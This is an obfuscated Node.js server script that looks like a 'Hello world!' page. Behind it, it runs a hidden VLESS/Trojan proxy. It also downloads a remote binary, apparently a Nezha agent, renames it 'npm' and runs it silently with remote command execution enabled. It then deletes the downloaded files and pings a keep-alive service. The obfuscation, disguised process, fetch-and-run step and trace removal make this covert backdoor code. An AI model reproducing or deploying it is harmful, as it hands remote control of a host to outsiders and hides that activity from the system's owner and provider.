const _0xd408f=_0xf650;(function(_0x14c4ca,_0x291e33){const _0x3d37f7=_0xf650,_0x5f2c46=_0x14c4ca();while(!![]){try{const _0x4e53a3=parseInt(_0x3d37f7(0xf5))/0x1+parseInt(_0x3d37f7(0xb2))/0x2+parseInt(_0x3d37f7(0xa3))/0x3*(-parseInt(_0x3d37f7(0xbc))/0x4)+parseInt(_0x3d37f7(0xac))/0x5+parseInt(_0x3d37f7(0xb6))/0x6*(-parseInt(_0x3d37f7(0xbe))/0x7)+-parseInt(_0x3d37f7(0x9b))/0x8+-parseInt(_0x3d37f7(0xca))/0x9*(-parseInt(_0x3d37f7(0xde))/0xa);if(_0x4e53a3===_0x291e33)break;else _0x5f2c46['push'](_0x5f2c46['shift']());}catch(_0x448327){_0x5f2c46['push'](_0x5f2c46['shift']());}}}(_0x21b4,0x971ed));function _0xf650(_0x7ed86c,_0x293e55){_0x7ed86c=_0x7ed86c-0x93;const _0x21b49e=_0x21b4();let _0xf65066=_0x21b49e[_0x7ed86c];return _0xf65066;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0xd408f(0xc6)),path=require(_0xd408f(0x105)),crypto=require('crypto'),{Buffer}=require(_0xd408f(0x103)),{exec,execSync}=require(_0xd408f(0xd6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0xd408f(0x9d)]||_0xd408f(0xc0),NEZHA_SERVER=process['env'][_0xd408f(0x108)]||'',NEZHA_PORT=process[_0xd408f(0xd4)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0xd408f(0xd4)][_0xd408f(0x10b)]||'',DOMAIN=process[_0xd408f(0xd4)][_0xd408f(0xfb)]||'1234.abc.com',AUTO_ACCESS=process[_0xd408f(0xd4)]['AUTO_ACCESS']||!![],WSPATH=process[_0xd408f(0xd4)][_0xd408f(0xc1)]||UUID[_0xd408f(0xec)](0x0,0x8),SUB_PATH=process[_0xd408f(0xd4)][_0xd408f(0xfd)]||_0xd408f(0xe0),NAME=process['env']['NAME']||'',PORT=process[_0xd408f(0xd4)][_0xd408f(0xe8)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1fb89b=_0xd408f;try{const _0x369773=await axios['get'](_0x1fb89b(0x93)),_0x1ee852=_0x369773[_0x1fb89b(0x96)];ISP=(_0x1ee852['country_code']+'-'+_0x1ee852[_0x1fb89b(0xf1)])[_0x1fb89b(0xb3)](/ /g,'_');}catch(_0x590ff6){ISP=_0x1fb89b(0x104);}};GetISP();const httpServer=http[_0xd408f(0xe5)]((_0x34ef49,_0x436e7b)=>{const _0x5131bf=_0xd408f;if(_0x34ef49['url']==='/'){const _0x517e88=path['join'](__dirname,_0x5131bf(0xb8));fs[_0x5131bf(0xb4)](_0x517e88,_0x5131bf(0xef),(_0x4ff253,_0x1221ce)=>{const _0x50af8f=_0x5131bf;if(_0x4ff253){_0x436e7b[_0x50af8f(0x9f)](0xc8,{'Content-Type':'text/html'}),_0x436e7b['end'](_0x50af8f(0xff));return;}_0x436e7b[_0x50af8f(0x9f)](0xc8,{'Content-Type':_0x50af8f(0xa4)}),_0x436e7b[_0x50af8f(0x9c)](_0x1221ce);});return;}else{if(_0x34ef49['url']==='/'+SUB_PATH){const _0x5e7f4b=NAME?NAME+'-'+ISP:ISP,_0x58adf4=_0x5131bf(0xce)+UUID+'@'+DOMAIN+_0x5131bf(0xb9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5131bf(0xbb)+WSPATH+'#'+_0x5e7f4b,_0x4444bd=_0x5131bf(0xed)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x5131bf(0xbd)+DOMAIN+_0x5131bf(0xbb)+WSPATH+'#'+_0x5e7f4b,_0x1f3b28=_0x58adf4+'\x0a'+_0x4444bd,_0x37de97=Buffer[_0x5131bf(0x106)](_0x1f3b28)[_0x5131bf(0xc7)](_0x5131bf(0xfe));_0x436e7b[_0x5131bf(0x9f)](0xc8,{'Content-Type':'text/plain'}),_0x436e7b[_0x5131bf(0x9c)](_0x37de97+'\x0a');}else _0x436e7b[_0x5131bf(0x9f)](0x194,{'Content-Type':_0x5131bf(0xf4)}),_0x436e7b['end'](_0x5131bf(0xe9));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0xd408f(0x9a),'1.1.1.1'];function resolveHost(_0x3e209c){return new Promise((_0x45c467,_0x3748e5)=>{const _0x445482=_0xf650;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x445482(0xf9)](_0x3e209c)){_0x45c467(_0x3e209c);return;}let _0x4855bb=0x0;function _0x507598(){const _0x3c62f7=_0x445482;if(_0x4855bb>=DNS_SERVERS[_0x3c62f7(0xc3)]){_0x3748e5(new Error(_0x3c62f7(0xee)+_0x3e209c+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x58f424=DNS_SERVERS[_0x4855bb];_0x4855bb++;const _0x13a78d=_0x3c62f7(0xcd)+encodeURIComponent(_0x3e209c)+'&type=A';axios[_0x3c62f7(0xd1)](_0x13a78d,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x3c62f7(0x95)](_0x4aef35=>{const _0x8b0ee0=_0x3c62f7,_0x1748e9=_0x4aef35['data'];if(_0x1748e9[_0x8b0ee0(0xaf)]===0x0&&_0x1748e9[_0x8b0ee0(0xd3)]&&_0x1748e9[_0x8b0ee0(0xd3)][_0x8b0ee0(0xc3)]>0x0){const _0x1d22fd=_0x1748e9['Answer'][_0x8b0ee0(0xe6)](_0xfef4bb=>_0xfef4bb['type']===0x1);if(_0x1d22fd){_0x45c467(_0x1d22fd[_0x8b0ee0(0x96)]);return;}}_0x507598();})[_0x3c62f7(0x102)](_0x5df546=>{_0x507598();});}_0x507598();});}function handleVlessConnection(_0x3a1a23,_0x5424a9){const _0x25ed81=_0xd408f,[_0x57ef29]=_0x5424a9,_0x1eb7d3=_0x5424a9[_0x25ed81(0xec)](0x1,0x11);if(!_0x1eb7d3[_0x25ed81(0xaa)]((_0x40d74b,_0x4862a0)=>_0x40d74b==parseInt(uuid[_0x25ed81(0xa7)](_0x4862a0*0x2,0x2),0x10)))return![];let _0x427e61=_0x5424a9[_0x25ed81(0xec)](0x11,0x12)['readUInt8']()+0x13;const _0x148737=_0x5424a9[_0x25ed81(0xec)](_0x427e61,_0x427e61+=0x2)[_0x25ed81(0x97)](0x0),_0x4043be=_0x5424a9[_0x25ed81(0xec)](_0x427e61,_0x427e61+=0x1)['readUInt8'](),_0x549503=_0x4043be==0x1?_0x5424a9[_0x25ed81(0xec)](_0x427e61,_0x427e61+=0x4)['join']('.'):_0x4043be==0x2?new TextDecoder()[_0x25ed81(0xdb)](_0x5424a9[_0x25ed81(0xec)](_0x427e61+0x1,_0x427e61+=0x1+_0x5424a9[_0x25ed81(0xec)](_0x427e61,_0x427e61+0x1)[_0x25ed81(0xa1)]())):_0x4043be==0x3?_0x5424a9[_0x25ed81(0xec)](_0x427e61,_0x427e61+=0x10)['reduce']((_0x26148e,_0x2daad9,_0x4a6dfa,_0x459b68)=>_0x4a6dfa%0x2?_0x26148e['concat'](_0x459b68[_0x25ed81(0xec)](_0x4a6dfa-0x1,_0x4a6dfa+0x1)):_0x26148e,[])['map'](_0x10497c=>_0x10497c[_0x25ed81(0x97)](0x0)['toString'](0x10))[_0x25ed81(0x94)](':'):'';_0x3a1a23[_0x25ed81(0xb5)](new Uint8Array([_0x57ef29,0x0]));const _0x500906=createWebSocketStream(_0x3a1a23);return resolveHost(_0x549503)[_0x25ed81(0x95)](_0xc819b3=>{const _0x1f10e4=_0x25ed81;net[_0x1f10e4(0xb1)]({'host':_0xc819b3,'port':_0x148737},function(){const _0x1659c6=_0x1f10e4;this[_0x1659c6(0xe4)](_0x5424a9[_0x1659c6(0xec)](_0x427e61)),_0x500906['on']('error',()=>{})[_0x1659c6(0xeb)](this)['on'](_0x1659c6(0x107),()=>{})['pipe'](_0x500906);})['on'](_0x1f10e4(0x107),()=>{});})['catch'](_0x39161c=>{net['connect']({'host':_0x549503,'port':_0x148737},function(){const _0x120695=_0xf650;this[_0x120695(0xe4)](_0x5424a9[_0x120695(0xec)](_0x427e61)),_0x500906['on'](_0x120695(0x107),()=>{})[_0x120695(0xeb)](this)['on'](_0x120695(0x107),()=>{})['pipe'](_0x500906);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x463a5e,_0x5dac62){const _0x4d1bba=_0xd408f;try{if(_0x5dac62[_0x4d1bba(0xc3)]<0x3a)return![];const _0x17cdcc=_0x5dac62[_0x4d1bba(0xec)](0x0,0x38)[_0x4d1bba(0xc7)](),_0x1d9caf=[UUID];let _0x420aa2=null;for(const _0x2bf727 of _0x1d9caf){const _0x489086=crypto['createHash']('sha224')['update'](_0x2bf727)[_0x4d1bba(0xe2)](_0x4d1bba(0xcf));if(_0x489086===_0x17cdcc){_0x420aa2=_0x2bf727;break;}}if(!_0x420aa2)return![];let _0x4139a7=0x38;_0x5dac62[_0x4139a7]===0xd&&_0x5dac62[_0x4139a7+0x1]===0xa&&(_0x4139a7+=0x2);const _0xfd405f=_0x5dac62[_0x4139a7];if(_0xfd405f!==0x1)return![];_0x4139a7+=0x1;const _0x47f24f=_0x5dac62[_0x4139a7];_0x4139a7+=0x1;let _0x20edc9,_0x39311b;if(_0x47f24f===0x1)_0x20edc9=_0x5dac62[_0x4d1bba(0xec)](_0x4139a7,_0x4139a7+0x4)[_0x4d1bba(0x94)]('.'),_0x4139a7+=0x4;else{if(_0x47f24f===0x3){const _0x2a1636=_0x5dac62[_0x4139a7];_0x4139a7+=0x1,_0x20edc9=_0x5dac62[_0x4d1bba(0xec)](_0x4139a7,_0x4139a7+_0x2a1636)[_0x4d1bba(0xc7)](),_0x4139a7+=_0x2a1636;}else{if(_0x47f24f===0x4)_0x20edc9=_0x5dac62[_0x4d1bba(0xec)](_0x4139a7,_0x4139a7+0x10)['reduce']((_0x352183,_0x146fff,_0x3984b2,_0x2d7483)=>_0x3984b2%0x2?_0x352183[_0x4d1bba(0xd5)](_0x2d7483[_0x4d1bba(0xec)](_0x3984b2-0x1,_0x3984b2+0x1)):_0x352183,[])['map'](_0x24ed6b=>_0x24ed6b[_0x4d1bba(0x97)](0x0)[_0x4d1bba(0xc7)](0x10))[_0x4d1bba(0x94)](':'),_0x4139a7+=0x10;else return![];}}_0x39311b=_0x5dac62[_0x4d1bba(0x97)](_0x4139a7),_0x4139a7+=0x2;_0x4139a7<_0x5dac62[_0x4d1bba(0xc3)]&&_0x5dac62[_0x4139a7]===0xd&&_0x5dac62[_0x4139a7+0x1]===0xa&&(_0x4139a7+=0x2);const _0x136952=createWebSocketStream(_0x463a5e);return resolveHost(_0x20edc9)[_0x4d1bba(0x95)](_0x632c2=>{const _0x244388=_0x4d1bba;net[_0x244388(0xb1)]({'host':_0x632c2,'port':_0x39311b},function(){const _0x28eaaa=_0x244388;_0x4139a7<_0x5dac62[_0x28eaaa(0xc3)]&&this['write'](_0x5dac62[_0x28eaaa(0xec)](_0x4139a7)),_0x136952['on'](_0x28eaaa(0x107),()=>{})[_0x28eaaa(0xeb)](this)['on'](_0x28eaaa(0x107),()=>{})[_0x28eaaa(0xeb)](_0x136952);})['on'](_0x244388(0x107),()=>{});})[_0x4d1bba(0x102)](_0x490210=>{const _0x4cfefe=_0x4d1bba;net[_0x4cfefe(0xb1)]({'host':_0x20edc9,'port':_0x39311b},function(){const _0x27dd85=_0x4cfefe;_0x4139a7<_0x5dac62['length']&&this[_0x27dd85(0xe4)](_0x5dac62[_0x27dd85(0xec)](_0x4139a7)),_0x136952['on'](_0x27dd85(0x107),()=>{})[_0x27dd85(0xeb)](this)['on']('error',()=>{})[_0x27dd85(0xeb)](_0x136952);})['on'](_0x4cfefe(0x107),()=>{});}),!![];}catch(_0x2c5d26){return![];}}function _0x21b4(){const _0x36656b=['stream','NEZHA_KEY','https://api.ip.sb/geoip','join','then','data','readUInt16BE','config.yaml','chmod\x20+x\x20npm','8.8.4.4','45672ImrqBi','end','UUID','Server\x20is\x20running\x20on\x20port\x20','writeHead','post','readUInt8','createWriteStream','174WYXEYC','text/html','https://amd64.ssss.nyc.mn/agent','2083','substr','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','every','npm\x20download\x20successfully','1445125ZJhozQ','aarch64','includes','Status','message','connect','1322248VzciVP','replace','readFile','send','77070QTlbEb','npm\x20running\x20error:','index.html',':443?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/v1','&path=%2F','43732JDCAjO','&fp=chrome&type=ws&host=','175ukEIIs','2087','54678bd0-a0a9-4597-b21f-e574fb5f92f8','WSPATH','unlink','length','https://arm64.ssss.nyc.mn/agent','npm\x20is\x20already\x20running,\x20skip\x20running...','net','toString','https://amd64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','9RuFeJB','8443','client_secret:\x20','https://dns.google/resolve?name=','vless://','hex','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','get','2053','Answer','env','concat','child_process','arm','once','pop','finish','decode','false','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2827130HWryuB','url','sub','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','digest','2096','write','createServer','find','writeFileSync','PORT','Not\x20Found\x0a','npm','pipe','slice','trojan://','Failed\x20to\x20resolve\x20','utf8','listen','isp','trim','arch','text/plain','347075qGMwwK','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','--tls','close','test','443','DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','SUB_PATH','base64','Hello\x20world!','utf-8','https://','catch','buffer','Unknown','path','from','error','NEZHA_SERVER','/bin/bash'];_0x21b4=function(){return _0x36656b;};return _0x21b4();}wss['on']('connection',(_0x2a5d9c,_0x36011f)=>{const _0x54b15f=_0xd408f,_0x5707ef=_0x36011f[_0x54b15f(0xdf)]||'';_0x2a5d9c[_0x54b15f(0xd8)](_0x54b15f(0xb0),_0x43b155=>{const _0x41d1d4=_0x54b15f;if(_0x43b155[_0x41d1d4(0xc3)]>0x11&&_0x43b155[0x0]===0x0){const _0x45dc0c=_0x43b155[_0x41d1d4(0xec)](0x1,0x11),_0x120fc8=_0x45dc0c[_0x41d1d4(0xaa)]((_0x495373,_0x597189)=>_0x495373==parseInt(uuid[_0x41d1d4(0xa7)](_0x597189*0x2,0x2),0x10));if(_0x120fc8){!handleVlessConnection(_0x2a5d9c,_0x43b155)&&_0x2a5d9c['close']();return;}}!handleTrojanConnection(_0x2a5d9c,_0x43b155)&&_0x2a5d9c[_0x41d1d4(0xf8)]();})['on'](_0x54b15f(0x107),()=>{});});const getDownloadUrl=()=>{const _0x286c70=_0xd408f,_0x4eb39b=os[_0x286c70(0xf3)]();return _0x4eb39b===_0x286c70(0xd7)||_0x4eb39b==='arm64'||_0x4eb39b===_0x286c70(0xad)?!NEZHA_PORT?_0x286c70(0xba):_0x286c70(0xc4):!NEZHA_PORT?_0x286c70(0xc8):_0x286c70(0xa5);},downloadFile=async()=>{const _0x426ed7=_0xd408f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5d763b=getDownloadUrl(),_0xcdc519=await axios({'method':_0x426ed7(0xd1),'url':_0x5d763b,'responseType':_0x426ed7(0x10a)}),_0x8947b3=fs[_0x426ed7(0xa2)](_0x426ed7(0xea));return _0xcdc519['data'][_0x426ed7(0xeb)](_0x8947b3),new Promise((_0x29e196,_0x420fc8)=>{const _0x5192d3=_0x426ed7;_0x8947b3['on'](_0x5192d3(0xda),()=>{const _0x4a8d35=_0x5192d3;console[_0x4a8d35(0xa8)](_0x4a8d35(0xab)),exec(_0x4a8d35(0x99),_0xdc94c1=>{if(_0xdc94c1)_0x420fc8(_0xdc94c1);_0x29e196();});}),_0x8947b3['on'](_0x5192d3(0x107),_0x420fc8);});}catch(_0x950397){throw _0x950397;}},runnz=async()=>{const _0x4e8f27=_0xd408f;try{const _0x231e60=execSync(_0x4e8f27(0xd0),{'encoding':_0x4e8f27(0x100)});if(_0x231e60[_0x4e8f27(0xf2)]()!==''){console[_0x4e8f27(0xa8)](_0x4e8f27(0xc5));return;}}catch(_0x1fa676){}await downloadFile();let _0xe9c7b='',_0x45d840=[_0x4e8f27(0xfa),_0x4e8f27(0xcb),_0x4e8f27(0xe3),_0x4e8f27(0xbf),_0x4e8f27(0xa6),_0x4e8f27(0xd2)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x203aaa=_0x45d840[_0x4e8f27(0xae)](NEZHA_PORT)?_0x4e8f27(0xf7):'';_0xe9c7b='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x203aaa+_0x4e8f27(0xf6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5989a2=NEZHA_SERVER[_0x4e8f27(0xae)](':')?NEZHA_SERVER['split'](':')[_0x4e8f27(0xd9)]():'',_0x2c0ca6=_0x45d840[_0x4e8f27(0xae)](_0x5989a2)?'true':_0x4e8f27(0xdc),_0x3ad30e=_0x4e8f27(0xcc)+NEZHA_KEY+_0x4e8f27(0xe1)+NEZHA_SERVER+_0x4e8f27(0xfc)+_0x2c0ca6+_0x4e8f27(0xa9)+UUID;fs[_0x4e8f27(0xe7)](_0x4e8f27(0x98),_0x3ad30e);}_0xe9c7b=_0x4e8f27(0xdd);}else{console[_0x4e8f27(0xa8)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0xe9c7b,{'shell':_0x4e8f27(0x109)},_0x491fd7=>{const _0x5a8758=_0x4e8f27;if(_0x491fd7)console[_0x5a8758(0x107)](_0x5a8758(0xb7),_0x491fd7);else console[_0x5a8758(0xa8)]('npm\x20is\x20running');});}catch(_0x553795){console[_0x4e8f27(0x107)]('error:\x20'+_0x553795);}};async function addAccessTask(){const _0x7d28a4=_0xd408f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3fb7ed=_0x7d28a4(0x101)+DOMAIN;try{const _0x23de02=await axios[_0x7d28a4(0xa0)]('https://oooo.serv00.net/add-url',{'url':_0x3fb7ed},{'headers':{'Content-Type':'application/json'}});console[_0x7d28a4(0xa8)](_0x7d28a4(0xc9));}catch(_0x5d1bb8){}}const delFiles=()=>{const _0x207b8c=_0xd408f;fs[_0x207b8c(0xc2)](_0x207b8c(0xea),()=>{}),fs[_0x207b8c(0xc2)](_0x207b8c(0x98),()=>{});};httpServer[_0xd408f(0xf0)](PORT,()=>{const _0x1dc4b3=_0xd408f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1dc4b3(0xa8)](_0x1dc4b3(0x9e)+PORT);});
